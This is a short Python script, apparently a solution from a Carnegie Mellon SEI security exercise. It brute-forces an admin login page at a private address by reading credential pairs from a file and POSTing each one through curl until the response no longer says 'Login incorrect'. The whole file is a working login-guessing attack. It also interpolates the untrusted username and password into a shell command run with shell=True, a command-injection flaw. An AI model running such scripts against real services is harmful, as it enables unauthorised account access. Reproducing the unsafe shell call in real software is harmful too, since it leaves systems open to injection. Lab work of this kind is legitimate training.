#!/usr/bin/python3

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import subprocess, json

def bruteForce():
    with open('webCreds', 'r') as f:
        webCreds = json.loads(f.read())

    for un,pwd in webCreds.items():
        out = subprocess.run(f"curl -X POST -F 'username={un}' -F 'password={pwd}' 10.9.8.10:4040/admin/login/",shell=True,capture_output=True).stdout.decode('utf-8')
        if "Login incorrect" not in out:
            print(f"Credentials found.\nUsername:\t{un}\nPassword:\t{pwd}")
            break

if __name__ == '__main__':
    bruteForce()
